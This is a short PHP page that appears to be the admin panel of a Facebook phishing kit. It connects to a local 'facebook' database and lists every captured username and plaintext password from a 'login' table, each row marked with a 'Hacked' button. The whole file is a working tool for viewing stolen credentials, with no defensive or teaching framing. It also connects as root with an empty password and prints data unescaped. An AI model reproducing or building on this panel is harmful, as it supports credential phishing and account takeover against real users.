<?php
    $servername = 'localhost';
    $serveruser = 'root';
    $serverkey = "";
    $dbname = "facebook";

    $conn = mysqli_connect($servername,$serveruser,$serverkey,$dbname) or die("couldnt connect to the server");

    $hacked = "SELECT * FROM `login`";
    $runhacked = $conn->query($hacked);


?>


<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>HACKER RANK</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" media="screen" href="main.css" />
    <link href="//netdna.bootstrapcdn.com/bootstrap/3.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//netdna.bootstrapcdn.com/bootstrap/3.0.0/js/bootstrap.min.js"></script>
<script src="//code.jquery.com/jquery-1.11.1.min.js"></script>
    <script src="main.js"></script>
</head>
<body>
<br><br><br><Br>
<center><h4>Developed by Venom(*SAEED*)</h4></center>
<br><br><br>
<div class="container">
    <div class="row col-md-8 col-md-offset-2 custyle">
    <table class="table table-striped custab">
    <thead>
   
        <tr>
          
            <th>Username</th>
            <th>Password</th>
            <th class="text-center">Action</th>
        </tr>
    </thead>
    <?php
        while($user = mysqli_fetch_assoc($runhacked)){
    ?>
            <tr>
                <td><?=$user['username']?></td>
                <td><?=$user['password']?></td>
                
                <td class="text-center"> <a href="#" class="btn btn-danger btn-xs"><span class="glyphicon glyphicon-remove"></span> Hacked</a></td>
            </tr>
    <?php
        }
    ?>
    </table>
    </div>
</div>
    
</body>
</html>